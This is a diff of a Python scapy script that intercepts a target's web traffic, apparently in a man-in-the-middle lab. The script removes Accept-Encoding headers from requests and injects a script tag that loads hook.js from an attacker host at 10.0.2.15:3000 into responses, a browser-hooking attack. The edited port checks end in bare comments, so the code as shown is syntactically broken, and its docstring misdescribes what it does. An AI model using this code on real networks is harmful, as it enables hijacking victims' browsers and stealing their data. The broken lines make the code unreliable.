@@ -13,18 +13,19 @@ def set_load(packet, load):
 
 
 def process_packet(packet):
-    """Modify downloads files on the fly while target uses HTTP"""
+    """Modify downloads files on the fly while target uses HTTP/HTTPS.
+    Do not forget to choose the port you will use on line 23 and 28 and uncomment them."""
     scapy_packet = scapy.IP (packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         #try:
                                            #.decode() in load
         load = scapy_packet[scapy.Raw].load
-        if scapy_packet[scapy.TCP].dport == 10000:
+        if scapy_packet[scapy.TCP].dport == #CHOOSE PORT HERE: 80 / 10000:
             print("HTTPS Request")
             # print(scapy_packet.show())
             load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
 
-        elif scapy_packet[scapy.TCP].sport == 10000:
+        elif scapy_packet[scapy.TCP].sport == #CHOOSE PORT HERE: 80 / 10000:
             print("HTTPS Response")
             #print(scapy_packet.show())
             injection_code = '<script src="http://10.0.2.15:3000/hook.js"></script>'
